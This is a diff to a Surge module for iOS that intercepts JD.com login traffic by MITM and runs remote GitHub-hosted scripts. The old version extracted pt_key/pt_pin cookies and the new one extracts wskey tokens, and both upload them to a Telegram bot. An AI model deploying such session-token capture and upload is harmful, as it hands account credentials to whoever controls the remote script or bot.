@@ -1,11 +1,10 @@
-#!name=京东 pt_key 自动抓取上传
-#!desc=自动抓取 api.m.jd.com 的 Cookie 并提取 pt_key/pt_pin 上传至指定 TG Bot(2026-1-3).
+#!name=京东wskey上传TG
+#!desc=京东pt_key和wskey上传(适配sso新接口)更新时间2026-03-31
 #!system=ios
 
-[MITM]
-hostname = %APPEND% api.m.jd.com
-
 [Script]
-# 京东 Cookie 抓取上传
-# 规则说明：匹配 client.action 接口，触发脚本提取 Cookie
-京东上传CK = type=http-request, pattern=^https?:\/\/api\.m\.jd\.com\/client\.action, requires-body=false, max-size=0, script-path=https://raw.githubusercontent.com/jdzjy/Surge/refs/heads/main/jd_ck.js
+# wskey上传脚本  
+京东wskey上传 = type=http-request,pattern=^https:\/\/sso\.jd\.com\/appJdst\/update,requires-body=1,max-size=0,timeout=1000,script-path=https://raw.githubusercontent.com/15974296618/my_scripts/main/wskey.js,script-update-interval=0
+
+[MITM]
+hostname = %APPEND% sso.jd.com
